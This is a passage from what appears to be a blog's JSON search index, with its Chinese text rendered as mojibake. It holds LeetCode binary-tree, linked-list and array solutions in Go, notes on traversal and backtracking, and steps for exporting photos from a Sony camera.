buildTree(preorder[len(preorder[:pos])+1:],inorder[pos+1:]) \n    return root\n}\n```\n\n### + [åˆå¹¶äºŒå‰æ ‘](https://leetcode-cn.com/problems/merge-two-binary-trees/)(ç®€å•)\n\n```go\nfunc mergeTrees(root1 *TreeNode, root2 *TreeNode) *TreeNode {\n    if root1 == nil{\n        return root2\n    }\n    if root2 == nil{\n        return root1\n    }\n\n    root1.Val = root1.Val + root2.Val\n    root1.Left = mergeTrees(root1.Left, root2.Left)\n    root1.Right = mergeTrees(root1.Right, root2.Right)\n    return root1  \n}\n```\n\n### + [ç›¸åŒçš„æ ‘](https://leetcode-cn.com/problems/same-tree/)(ç®€å•)\n\n```go\nfunc isSameTree(p *TreeNode, q *TreeNode) bool {\n    if p == nil && q == nil {\n        return true\n    }\n    if p == nil || q == nil {\n        return false\n    }\n\n    return p.Val == q.Val && isSameTree(p.Left, q.Left) && isSameTree(p.Right, q.Right)\n}\n```\n\n\n\n### + [å¦ä¸€ä¸ªæ ‘çš„å­æ ‘](https://leetcode-cn.com/problems/subtree-of-another-tree/)(ç®€å•)\n\n```go\nfunc isSubtree(root *TreeNode, subRoot *TreeNode) bool {\n    if root == nil || subRoot == nil {\n        return false\n    }\n\n    if isSameTree(root, subRoot) {\n        return true\n    }\n\n    return isSubtree(root.Left, subRoot) || isSubtree(root.Right, subRoot)\n}\n\n\nfunc isSameTree(p *TreeNode, q *TreeNode) bool {\n  if p == nil && q == nil {\n        return true\n    }\n    if p == nil || q == nil {\n        return false\n    }\n\n    return p.Val == q.Val && isSameTree(p.Left, q.Left) && isSameTree(p.Right, q.Right)\n}\n```\n\n\n\n### + [æ ‘çš„å­ç»“æ„](https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/)(ä¸­ç­‰)\n\n```go\nfunc isSubStructure(A *TreeNode, B *TreeNode) bool {\n    if A == nil || B == nil {\n        return false\n    }\n\n    return isContain(A, B) || isSubStructure(A.Left, B) || isSubStructure(A.Right, B)\n    \n}\n\n\n// A,Bæ ¹èŠ‚ç‚¹ç›¸åŒï¼ŒBæ˜¯ä¸æ˜¯Açš„å­ç»“æ„\nfunc isContain(A *TreeNode, B *TreeNode) bool {\n    if B == nil {\n        return true\n    }\n    if A == nil {\n        return false\n    }\n    if A.Val != B.Val {\n        return false\n    }\n    return isContain(A.Left, B.Left) && isContain(A.Right, B.Right)\n}\n```\n\n\n\n### + [å•å€¼äºŒå‰æ ‘](https://leetcode-cn.com/problems/univalued-binary-tree/)(ç®€å•)\n\n```go\nfunc isUnivalTree(root *TreeNode) bool {\n    if root == nil {\n        return true\n    }\n    if root.Left != nil && root.Val != root.Left.Val {\n        return false\n    }\n    if root.Right != nil && root.Val != root.Right.Val {\n        return false\n    }\n    return isUnivalTree(root.Left) && isUnivalTree(root.Right)\n}\n```\n\n\n\n\n\n### + [å¯¹ç§°çš„äºŒå‰æ ‘](https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/)(ç®€å•)\n\n```go\nfunc isSymmetric(root *TreeNode) bool {\n    if root == nil {\n        return true\n    }\n    return isMirror(root.Left, root.Right)\n}\n\n\nfunc isMirror(l, r *TreeNode) bool {\n    if l == nil && r == nil {\n        return true\n    }\n    if l == nil || r == nil{\n        return false\n    }\n\n   return l.Val == r.Val && isMirror(l.Right, r.Left) && isMirror(l.Left,r.Right)\n}\n```\n\n\n\n### + [äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ](https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/)(ç®€å•) \n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n\tval := root.Val\n    pv := p.Val\n    qv := q.Val\n\n    if pv > val && qv > val {\n        return lowestCommonAncestor(root.Right, p, q)\n    }else if pv < val && qv < val {\n        return lowestCommonAncestor(root.Left, p, q)\n    }else{\n        return root\n    }\n}\n```\n\n\n\n### + [äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ](https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/) (ä¸­ç­‰)\n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n    if root == nil {\n        return nil\n    }\n    if p == root || q == root {\n        return root\n    }\n\n    l := lowestCommonAncestor(root.Left, p, q)\n    r := lowestCommonAncestor(root.Right,p, q)\n    if l != nil && r != nil {// å·¦å³å„ä¸€ä¸ª\n        return root\n    }\n    if l != nil {// ä¸¤éƒ½åœ¨å·¦è¾¹\n        return l\n    }\n    if r != nil{ // ä¸¤éƒ½åœ¨å³è¾¹\n        return r\n    }\n\n    return nil\n}\n```\n\n\n\n### + [äºŒå‰æœç´¢æ ‘çš„ç¬¬kå¤§èŠ‚ç‚¹](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-di-kda-jie-dian-lcof/)(ç®€å•)\n\n```go\nvar arr[]int\n\nfunc kthLargest(root *TreeNode, k int) int {\n    if root == nil {\n        return 0\n    }\n    arr = []int{}\n    dfs(root)\n    return arr[k-1]\n}\n\nfunc dfs(root *TreeNode) {\n    if root == nil  {\n        return \n    }\n    dfs(root.Right)\n    arr = append(arr, root.Val)\n    dfs(root.Left)\n}\n```\n\n### + [äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„](https://leetcode-cn.com/problems/er-cha-shu-zhong-he-wei-mou-yi-zhi-de-lu-jing-lcof/)(ä¸­ç­‰) TODO\n\n### + [äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-hou-xu-bian-li-xu-lie-lcof/)(ä¸­ç­‰) TODO\n\n### + [äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-yu-shuang-xiang-lian-biao-lcof/)(ä¸­ç­‰) TODO\n\n# 3. ç®—æ³•ç†è§£\n\n### 3.1  ä¸¤ç§æ€è·¯è§£é¢˜\n\näºŒå‰æ ‘çš„å‰åºéå†ç»“æœæ€ä¹ˆç®—ï¼Ÿ\n\n+ å›æœ”ç®—æ³•æ ¸å¿ƒæ€è·¯ï¼ˆé€’å½’éå†ï¼‰\n\n```java\nList<Integer> res = new LinkedList<>();\nList<Integer> preorder(TreeNode root) {\n    traverse(root);\n\t\treturn res; \n}\n\nvoid traverse(TreeNode root) { // æ²¡æœ‰è¿”å›å€¼\n    if (root == null) {\n\t\t\treturn; \n    }\n    res.addLast(root.val);\n    traverse(root.left);\n    traverse(root.right);\n}\n```\n\n+ åŠ¨æ€è§„åˆ’æ ¸å¿ƒæ€è·¯ ï¼ˆåˆ†è§£ï¼‰\n\n```java\nList<Integer> preorder(TreeNode root) {\n   List<Integer> res = new LinkedList<>();\n   if (root == null) {\n\t\t\treturn res; \n   }\n\n\tres.add(root.val);\n  res.addAll(preorder(root.left)); \n \tres.addAll(preorder(root.right));\n  return res\n}\n\n```\n\n### 3.2 æ·±å…¥ç†è§£å‰ä¸­ååº\n\n**å‰ä¸­ååºæ˜¯éå†äºŒå‰æ ‘è¿‡ç¨‹ä¸­å¤„ç†æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„ä¸‰ä¸ªç‰¹æ®Šæ—¶é—´ç‚¹**ï¼Œç»ä¸ä»…ä»…æ˜¯ä¸‰ä¸ªé¡ºåºä¸åŒçš„List\n\nå‰åºä½ç½®çš„ä»£ç åœ¨åˆšåˆšè¿›å…¥ä¸€ä¸ªäºŒå‰æ ‘èŠ‚ç‚¹çš„æ—¶å€™æ‰§è¡Œï¼›\n\nååºä½ç½®çš„ä»£ç åœ¨å°†è¦ç¦»å¼€ä¸€ä¸ªäºŒå‰æ ‘èŠ‚ç‚¹çš„æ—¶å€™æ‰§è¡Œï¼›\n\nä¸­åºä½ç½®çš„ä»£ç åœ¨ä¸€ä¸ªäºŒå‰æ ‘èŠ‚ç‚¹å·¦å­æ ‘éƒ½éå†å®Œï¼Œå³å°†å¼€å§‹éå†å³å­æ ‘çš„æ—¶å€™æ‰§è¡Œã€‚\n\n### 3.3 ååºåŠ å¼º\n\n**å‰åºä½ç½®çš„ä»£ç åªèƒ½ä»å‡½æ•°å‚æ•°ä¸­è·å–çˆ¶èŠ‚ç‚¹ä¼ é€’æ¥çš„æ•°æ®ï¼Œè€Œååºä½ç½®çš„ä»£ç ä¸ä»…å¯ä»¥è·å–å‚æ•°æ•°æ®ï¼Œè¿˜å¯ä»¥è·å–åˆ°å­æ ‘é€šè¿‡å‡½æ•°è¿”å›å€¼ä¼ é€’å›æ¥çš„æ•°æ®**ã€‚\n\n```go\n// å®šä¹‰ï¼šè¾“å…¥ä¸€æ£µäºŒå‰æ ‘ï¼Œè¿”å›è¿™æ£µäºŒå‰æ ‘çš„èŠ‚ç‚¹æ€»æ•°\nint count(TreeNode root) {\n    if (root == null) {\n        return 0;\n    }\n    int leftCount = count(root.left);\n    int rightCount = count(root.right);\n    // ååºä½ç½®\n    printf(\"èŠ‚ç‚¹ %s çš„å·¦å­æ ‘æœ‰ %d ä¸ªèŠ‚ç‚¹ï¼Œå³å­æ ‘æœ‰ %d ä¸ªèŠ‚ç‚¹\",\n            root, leftCount, rightCount);\n\n    return leftCount + rightCount + 1;\n}\n```\n\nåªæœ‰ååºä½ç½®æ‰èƒ½é€šè¿‡è¿”å›å€¼è·å–å­æ ‘çš„ä¿¡æ¯ã€‚**æ¢å¥è¯è¯´ï¼Œä¸€æ—¦ä½ å‘ç°é¢˜ç›®å’Œå­æ ‘æœ‰å…³ï¼Œé‚£å¤§æ¦‚ç‡è¦ç»™å‡½æ•°è®¾ç½®åˆç†çš„å®šä¹‰å’Œè¿”å›å€¼ï¼Œåœ¨ååºä½ç½®å†™ä»£ç äº†**ã€‚\n\né‡åˆ°å­æ ‘é—®é¢˜ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ç»™å‡½æ•°è®¾ç½®è¿”å›å€¼ï¼Œç„¶ååœ¨ååºä½ç½®åšæ–‡ç« ã€‚\n\n### 3.4 DFS åˆæ˜¯ä»€ä¹ˆ\n\nåŠ¨æ€è§„åˆ’/DFS/å›æº¯ç®—æ³• éƒ½å¯ä»¥çœ‹åšäºŒå‰æ ‘é—®é¢˜çš„æ‰©å±•ï¼Œåªæ˜¯å®ƒä»¬çš„å…³æ³¨ç‚¹ä¸åŒï¼š\n\n+ åŠ¨æ€è§„åˆ’ç®—æ³•å±äºåˆ†è§£é—®é¢˜çš„æ€è·¯ï¼Œå®ƒçš„å…³æ³¨ç‚¹åœ¨æ•´æ£µã€Œå­æ ‘ã€ã€‚\n+ å›æº¯ç®—æ³•å±äºéå†çš„æ€è·¯ï¼Œå®ƒçš„å…³æ³¨ç‚¹åœ¨èŠ‚ç‚¹é—´çš„ã€Œæ ‘æã€ã€‚\n+ DFS ç®—æ³•å±äºéå†çš„æ€è·¯ï¼Œå®ƒçš„å…³æ³¨ç‚¹åœ¨å•ä¸ªã€ŒèŠ‚ç‚¹ã€ã€‚\n\n##### åŠ¨æ€è§„åˆ’\n\n```go\n// è®¡ç®—è¿™æ£µäºŒå‰æ ‘å…±æœ‰å¤šå°‘ä¸ªèŠ‚ç‚¹ã€‚\nint count(TreeNode root) {\n    if (root == null) {\n        return 0;\n    }\n    // æˆ‘è¿™ä¸ªèŠ‚ç‚¹å…³å¿ƒçš„æ˜¯æˆ‘çš„ä¸¤ä¸ªå­æ ‘çš„èŠ‚ç‚¹æ€»æ•°åˆ†åˆ«æ˜¯å¤šå°‘\n    int leftCount = count(root.left);\n    int rightCount = count(root.right);\n    // ååºä½ç½®ï¼Œå·¦å³å­æ ‘èŠ‚ç‚¹æ•°åŠ ä¸Šè‡ªå·±å°±æ˜¯æ•´æ£µæ ‘çš„èŠ‚ç‚¹æ•°\n    return leftCount + rightCount + 1;\n}\n```\n\nåŠ¨æ€è§„åˆ’åˆ†è§£é—®é¢˜çš„æ€è·¯ï¼Œå®ƒçš„ç€çœ¼ç‚¹æ°¸è¿œæ˜¯ç»“æ„ç›¸åŒçš„æ•´ä¸ªå­é—®é¢˜ï¼Œç±»æ¯”åˆ°äºŒå‰æ ‘ä¸Šå°±æ˜¯ã€Œå­æ ‘ã€ã€‚\n\n##### å›æº¯ç®—æ³•\n\n```go\n// ç”¨éå†çš„æ€è·¯å†™ä¸€ä¸ª traverse å‡½æ•°ï¼Œæ‰“å°å‡ºéå†è¿™æ£µäºŒå‰æ ‘çš„è¿‡ç¨‹\nvoid traverse(TreeNode root) {\n    if (root == null) return;\n    printf(\"ä»èŠ‚ç‚¹ %s è¿›å…¥èŠ‚ç‚¹ %s\", root, root.left);\n    traverse(root.left);\n    printf(\"ä»èŠ‚ç‚¹ %s å›åˆ°èŠ‚ç‚¹ %s\", root.left, root);\n\n    printf(\"ä»èŠ‚ç‚¹ %s è¿›å…¥èŠ‚ç‚¹ %s\", root, root.right);\n    traverse(root.right);\n    printf(\"ä»èŠ‚ç‚¹ %s å›åˆ°èŠ‚ç‚¹ %s\", root.right, root);\n}\n\n\nvoid backtrack(...) {\n    for (int i = 0; i < ...; i++) {\n        // åšé€‰æ‹©\n        ...\n\n        // è¿›å…¥ä¸‹ä¸€å±‚å†³ç­–æ ‘\n        backtrack(...);\n\n        // æ’¤é”€åˆšæ‰åšçš„é€‰æ‹©\n        ...\n    }\n}\n```\n\nè¿™å°±æ˜¯å›æº¯ç®—æ³•éå†çš„æ€è·¯ï¼Œå®ƒçš„ç€çœ¼ç‚¹æ°¸è¿œæ˜¯åœ¨èŠ‚ç‚¹ä¹‹é—´ç§»åŠ¨çš„è¿‡ç¨‹ï¼Œç±»æ¯”åˆ°äºŒå‰æ ‘ä¸Šå°±æ˜¯ã€Œæ ‘æã€ã€‚\n\n##### DFS (æ·±åº¦ä¼˜å…ˆæœç´¢)\n\n```java\n// å†™ä¸€ä¸ª traverse å‡½æ•°ï¼ŒæŠŠè¿™æ£µäºŒå‰æ ‘ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½åŠ ä¸€ã€‚\n\nvoid traverse(TreeNode root) {\n    if (root == null) return;\n    // éå†è¿‡çš„æ¯ä¸ªèŠ‚ç‚¹çš„å€¼åŠ ä¸€\n    root.val++;\n    traverse(root.left);\n    traverse(root.right);\n}\n```\n\nè¿™å°±æ˜¯ DFS ç®—æ³•éå†çš„æ€è·¯ï¼Œå®ƒçš„ç€çœ¼ç‚¹æ°¸è¿œæ˜¯åœ¨å•ä¸€çš„èŠ‚ç‚¹ä¸Šï¼Œç±»æ¯”åˆ°äºŒå‰æ ‘ä¸Šå°±æ˜¯å¤„ç†æ¯ä¸ªã€ŒèŠ‚ç‚¹ã€ã€‚\n\n### 3.5 DFS å’Œå›æœ”åŒºåˆ«\n\n```java\n// DFS ç®—æ³•æŠŠã€Œåšé€‰æ‹©ã€ã€Œæ’¤é”€é€‰æ‹©ã€çš„é€»è¾‘æ”¾åœ¨ for å¾ªç¯å¤–é¢\nvoid dfs(Node root) {\n    if (root == null) return;\n    // åšé€‰æ‹©\n    print(\"æˆ‘å·²ç»è¿›å…¥èŠ‚ç‚¹ %s å•¦\", root)\n    for (Node child : root.children) {\n        dfs(child);\n    }\n    // æ’¤é”€é€‰æ‹©\n    print(\"æˆ‘å°†è¦ç¦»å¼€èŠ‚ç‚¹ %s å•¦\", root)\n}\n\n// å›æº¯ç®—æ³•æŠŠã€Œåšé€‰æ‹©ã€ã€Œæ’¤é”€é€‰æ‹©ã€çš„é€»è¾‘æ”¾åœ¨ for å¾ªç¯é‡Œé¢\nvoid backtrack(Node root) {\n    if (root == null) return;\n    for (Node child : root.children) {\n        // åšé€‰æ‹©\n        print(\"æˆ‘ç«™åœ¨èŠ‚ç‚¹ %s åˆ°èŠ‚ç‚¹ %s çš„æ ‘æä¸Š\", root, child)\n        backtrack(child);\n        // æ’¤é”€é€‰æ‹©\n        print(\"æˆ‘å°†è¦ç¦»å¼€èŠ‚ç‚¹ %s åˆ°èŠ‚ç‚¹ %s çš„æ ‘æä¸Š\", child, root)\n    }\n}\n```\n\nçœ‹åˆ°äº†å§ï¼Œä½ å›æº¯ç®—æ³•å¿…é¡»æŠŠã€Œåšé€‰æ‹©ã€å’Œã€Œæ’¤é”€é€‰æ‹©ã€çš„é€»è¾‘æ”¾åœ¨ for å¾ªç¯é‡Œé¢ï¼Œå¦åˆ™æ€ä¹ˆæ‹¿åˆ°ã€Œæ ‘æã€çš„ä¸¤ä¸ªç«¯ç‚¹ï¼Ÿ\n\n### 3.6 å±‚åºéå† (BFS)\n\n```c++\nvoid levelTraverse(TreeNode* root) {\n    if (root == nullptr) return;\n    queue<TreeNode*> q;\n    q.push(root);\n\n    // ä»ä¸Šåˆ°ä¸‹éå†äºŒå‰æ ‘çš„æ¯ä¸€å±‚\n    while (!q.empty()) {\n        int sz = q.size();\n        // ä»å·¦åˆ°å³éå†æ¯ä¸€å±‚çš„æ¯ä¸ªèŠ‚ç‚¹\n        for (int i = 0; i < sz; i++) {\n            TreeNode* cur = q.front();\n            q.pop();\n            // å°†ä¸‹ä¸€å±‚èŠ‚ç‚¹æ”¾å…¥é˜Ÿåˆ—\n            if (cur->left != nullptr) {\n                q.push(cur->left);\n            }\n            if (cur->right != nullptr) {\n                q.push(cur->right);\n            }\n        }\n    }\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://labuladong.gitee.io/algo/tree-class/\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"sonyç›¸æœºç…§ç‰‡å¯¼å‡ºæ“ä½œ","url":"%2Fp%2Fe672b089.html","content":"\n\n\n### 1. ç…§ç‰‡å¯¼å‡ºåˆ°æ‰‹æœºä¸Š(æ–¹ä¾¿å¿«é€Ÿä½¿ç”¨å’Œä¿®æ”¹)\n\n1. sony ç›¸æœº-> ç¬¬ä¸‰é¡¹ -> å‘é€åˆ°æ™ºèƒ½æ‰‹æœº -> åœ¨æ™ºèƒ½æ‰‹æœºä¸Šé€‰æ‹© -> å‡ºç°äº† wifi\n2. æ‰‹æœºè¿æ¥sony ç›¸æœºçš„ wifi\n3. æ‰‹æœº->Imaging Edge Mobile->è¿æ¥è£…ç½®->æŸ¥çœ‹ç…§ç‰‡\n\n<!-- more -->\n\n### 2. ç…§ç‰‡å¯¼å‡ºåˆ° macbook\n\nç¡¬ç›˜å¤ªå°æ”¾å¼ƒ\n\n\n\n### 3. ç…§ç‰‡å¯¼å‡ºåˆ° windows\n\n1. ç”¨æ•°æ®çº¿è¿æ¥\n\n2. å‡ºç°Uç›˜, DCIMæ–‡ä»¶å¤¹å†…, æ˜¯ç…§ç‰‡, ç›´æ¥å‰ªåˆ‡å‡ºæ¥\n\n3. è§†é¢‘æ˜¯åœ¨PRIVATEæ–‡ä»¶å¤¹å†…\n","tags":["æ‘„å½±"],"categories":["æ‘„å½±"]},{"title":"2ç®—æ³•-é“¾è¡¨","url":"%2Fp%2F39bde9f0.html","content":"\n# 1. åŒæŒ‡é’ˆæŠ€å·§\n\n### 1.1 [åè½¬é“¾è¡¨](https://leetcode-cn.com/problems/reverse-linked-list/)ğŸ”¥\n\n+ é€’å½’ç‰ˆæœ¬ï¼ˆè¿”å›æœ€åçš„æŒ‡é’ˆï¼‰ï¼ˆåŸåœ°æ”¹ä¸¤ä¸ªæŒ‡å‘ï¼‰\n\n```go\n// 1->2->3->nil\n\n/// head=3\n// return\n\n/// head=2\n// 3->2\n// 2->nil\n\n/// head=1\n// 2->1\n// 1->nil\n\nfunc ReverseList(head *ListNode) *ListNode {\n\tif head == nil || head.Next == nil {\n\t\treturn head\n\t}\n\n\tlast := ReverseList(head.Next)\n\thead.Next.Next = head\n\thead.Next = nil\n\n\treturn last\n}\n```\n\n<!-- more -->\n\n+ å¾ªç¯ç‰ˆæœ¬ï¼ˆæä¸‰ä¸ªä¸´æ—¶æŒ‡é’ˆï¼Œå‰ï¼Œä¸­ï¼Œåï¼‰ï¼ˆå››è¿å’¬ï¼‰\n\n```c\n\t// 1->2->3->nil\n\n\t// 1->nil  \t\t\t | 2->3->nil\n\t// 2->1->nil\t\t | 3->nil\n\t// 3->2->1->nil  |  nil\n\n```\n\nä»£ç å¦‚ä¸‹ï¼š\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ListNode struct {\n\tVal  int\n\tNext *ListNode\n}\n\nfunc ReverseList(head *ListNode) *ListNode {\n\tvar prev, next *ListNode \n\tcurr := head\n\tfor curr != nil {\n\t\tnext = curr.Next\n\t\tcurr.Next = prev\n\t\tprev = curr\n\t\tcurr = next\n\t}\n\n\treturn prev\n}\n\nfunc main() {\n\tList1 := BuildList()\n\tfmt.Println(\"old\", GetList(List1))\n\tList2 := ReverseList(List1)\n\tfmt.Println(\"new\", GetList(List2))\n}\n\nfunc BuildList() *ListNode {\n\tL3 := &ListNode{Val: 3}\n\tL2 := &ListNode{Val: 2, Next: L3}\n\tL1 := &ListNode{Val: 1, Next: L2}\n\treturn L1\n}\n\nfunc GetList(head *ListNode) []int {\n\tvar arr []int\n\tfor head != nil {\n\t\tarr = append(arr, head.Val)\n\t\thead = head.Next\n\t}\n\treturn arr\n}\n\n```\n\n# \n\n### 1.2  åˆå¹¶é“¾è¡¨ğŸ”¥\n\n+ https://leetcode.cn/problems/merge-two-sorted-lists/\n\n+ `l1, l2` ç±»ä¼¼äºæ‹‰é“¾ä¸¤ä¾§çš„é”¯é½¿ï¼ŒæŒ‡é’ˆ `p` å°±å¥½åƒæ‹‰é“¾çš„æ‹‰ç´¢ï¼Œå°†ä¸¤ä¸ªæœ‰åºé“¾è¡¨åˆå¹¶\n\n```go\nfunc mergeTwoLists(list1 *ListNode, list2 *ListNode) *ListNode {\n    p1 := list1 \n    p2 := list2\n    p := &ListNode{}\n    dummy := p\n\n    for p1 !=nil && p2 !=nil{\n        if p1.Val > p2.Val{\n            p.Next = p2\n            p2 = p2.Next\n        }else{\n            p.Next = p1\n            p1 = p1.Next\n        }\n        p = p.Next\n    }\n\n    if p1 != nil {\n        p.Next = p1\n    }\n    if p2 != nil {\n        p.Next = p2\n    }\n    \n    return dummy.Next\n}\n```\n\n\n\n### 1.3 åˆ¤æ–­é“¾è¡¨æœ‰ç¯ğŸ”¥\n\n+ https://leetcode.cn/problems/linked-list-cycle/\n+ ç›¸äº¤ç‚¹ä¸æ˜¯æœ‰ç¯çš„é‚£ä¸ªç‚¹\n\n```go\nfunc hasCycle(head *ListNode) bool {\n    slow := head\n    fast := head\n    for (fast != nil && fast.Next != nil){  // ä¸€å®šè¦åˆ¤æ–­ fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            return true\n        }\n    }\n    return false\n}\n```\n\n**å¦‚æœæœ‰ç¯ï¼Œè¿”å›ç¯çš„èŠ‚ç‚¹**\n\n+ https://leetcode.cn/problems/linked-list-cycle-ii/\n\n```go\nfunc detectCycle(head *ListNode) *ListNode {\n    slow := head\n    fast := head\n    cycle := false\n    for (fast != nil && fast.Next != nil){ \n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            cycle = true\n            break\n        }\n    }\n    if !cycle{\n        return nil\n    }\n\n    p1 := head\n    p2 := slow // æˆ–è€… fast\n    for p1 != p2 {\n        p1 = p1.Next\n        p2 = p2.Next\n    }\n    return p1\n}\n```\n\n### 1.4 åˆ†å‰²é“¾è¡¨ \n\n+ https://leetcode.cn/problems/partition-list/description/\n+ å¤šç”¨ä¸´æ—¶æŒ‡é’ˆï¼Œå…ˆæ”¾åˆ°ä¸¤ä¸ªé“¾è¡¨ä¸Šï¼Œæœ€åå†æ¥ä¸Šã€‚\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ListNode struct {\n\tVal  int\n\tNext *ListNode\n}\n\nfunc BuildList() *ListNode {\n\tL1 := &ListNode{Val: 1}\n\tL2 := &ListNode{Val: 4}\n\tL3 := &ListNode{Val: 3}\n\tL4 := &ListNode{Val: 2}\n\tL5 := &ListNode{Val: 5}\n\tL6 := &ListNode{Val: 2}\n\tL1.Next = L2\n\tL2.Next = L3\n\tL3.Next = L4\n\tL4.Next = L5\n\tL5.Next = L6\n\treturn L1\n}\nfunc GetList(head *ListNode) []int {\n\tvar arr []int\n\tfor head != nil {\n\t\tarr = append(arr, head.Val)\n\t\thead = head.Next\n\t}\n\treturn arr\n}\n\nfunc partition(head *ListNode, x int) *ListNode {\n\tdummy1 := &ListNode{} // å°äºx\n\tdummy2 := &ListNode{} // å¤§äºx\n\tp1 := dummy1          // å°äºx\n\tp2 := dummy2          // å¤§äºx\n\n\tp := head\n\tfor p != nil {\n\t\tif p.Val < x {\n\t\t\tp1.Next = p\n\t\t\tp1 = p1.Next\n\t\t} else {\n\t\t\tp2.Next = p\n\t\t\tp2 = p2.Next\n\t\t}\n\n\t\t// æŠŠåŸå§‹é“¾è¡¨æ•´æ–­\n\t\ttmp := p.Next\n\t\tp.Next = nil\n\t\tp = tmp\n\t}\n\t\n  // æ¥ä¸Šé“¾è¡¨\n\tp1.Next = dummy2.Next\n\treturn dummy1.Next\n}\n\nfunc main() {\n\thead := BuildList()\n\tfmt.Println(\"origin\", GetList(head))\n\tpartitionList := partition(head, 3)\n\tfmt.Println(\"partition\", GetList(partitionList))\n}\n\n```\n\n### 1.5 é“¾è¡¨æ˜¯å¦ç›¸äº¤\n\n+ https://leetcode.cn/problems/intersection-of-two-linked-lists/\n\n```go\nfunc getIntersectionNode(headA, headB *ListNode) *ListNode {\n    pos1 := headA\n    pos2 := headB\n    for pos1 != pos2 {\n        if pos1 != nil{\n            pos1 = pos1.Next\n        }else{\n            pos1 = headB\n        }\n\n        if pos2 != nil {\n            pos2 = pos2.Next\n        }else{\n            pos2 = headA\n        }\n    }\n    return pos2\n}   \n```\n\n### 1.6 å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹\n\n+ https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\n\n+ å…ˆè®©å¿«æŒ‡é’ˆèµ°kæ­¥ï¼Œç„¶åä¸¤ä¸ªæŒ‡é’ˆåŒæ­¥èµ°ï¼Œå½“å¿«æŒ‡é’ˆèµ°åˆ°å¤´æ—¶ï¼Œæ…¢æŒ‡é’ˆå°±æ˜¯é“¾è¡¨å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹ã€‚\n\n```go\nfunc getKthFromEnd(head *ListNode, k int) *ListNode {\n    fast := head\n    slow := head\n    for k >0 && fast != nil {\n        fast = fast.Next\n        k--\n    }\n    for fast != nil {\n        fast = fast.Next\n        slow = slow.Next\n    }\n    return slow\n}\n```\n\n\n\n# \n\n# 2. å…¶ä»–\n\n### + [ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹](https://leetcode-cn.com/problems/swap-nodes-in-pairs/)(ä¸­ç­‰)\n\n```go\nfunc swapPairs(head *ListNode) *ListNode {\n    if head == nil || head.Next == nil{\n        return head\n    }\n\n    next := head.Next  \n    ok := swapPairs(head.Next.Next)\n    head.Next.Next = head\n    head.Next = ok\n\n    return next\n}\n```\n\n\n\n\n\n\n\n### + [åˆ é™¤é“¾è¡¨çš„èŠ‚ç‚¹](https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/)(ç®€å•)\n\n```go\nfunc deleteNode(head *ListNode, val int) *ListNode {\n    if head == nil {\n        return nil\n    }\n    head.Next = deleteNode(head.Next, val)\n    if head.Val == val {\n        return head.Next\n    }else{\n        return head\n    }\n}\n```\n\n\n\n### + [ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨](https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/)(ç®€å•)\n\n```go\nfunc reversePrint(head *ListNode) []int {\n    if head == nil {\n        return nil\n    }\n\n    res := append(reversePrint(head.Next), head.Val) \n    return res\n}\n```\n\n\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"1ç®—æ³•-æ•°ç»„","url":"%2Fp%2F52bc2d68.html","content":"\n### 1. [æ•°ç»„ä¸­é‡å¤çš„æ•°å­—](https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/)(ç®€å•)\n\n+ å¤´è„‘é£æš´: ä¸´æ—¶æ•°ç»„++\n\n  ```go\n  func findRepeatNumber(nums []int) int {\n  \n      arr := make([]int, len(nums), len(nums))\n      for i := 0; i < len(nums); i++{\n          arr[nums[i]]++   \t\t\t\t\t\t// é¢˜ç›®è¯´æ˜, <n, ä¸ä¼šè¶Šç•Œ\n          if arr[nums[i]] > 1{\n              return nums[i]\n          }\n      }\n  \n      return 0\n  }\n  ```\n\n\n\n### 2. [åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„](https://leetcode-cn.com/problems/merge-sorted-array/)\n\n  ```bash\n  func merge(nums1 []int, m int, nums2 []int, n int)  {\n\n      res := make([]int, 0, m+n)\n      p1 := 0\n      p2 := 0\n      for {\n          if p1 == m {\n              res = append(res, nums2[p2:]...)\n              break\n          }\n          if p2 == n {\n              res = append(res, nums1[p1:]...)\n              break\n          }\n          if nums1[p1] < nums2[p2] {\n              res = append(res, nums1[p1])\n              p1++\n          }else{\n              res = append(res, nums2[p2])\n              p2++\n          }\n      }\n\n      copy(nums1, res)\n  }\n  ```\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"ç®—æ³•å¤æ‚åº¦çš„ç†è§£","url":"%2Fp%2F7db09267.html","content":"\n# 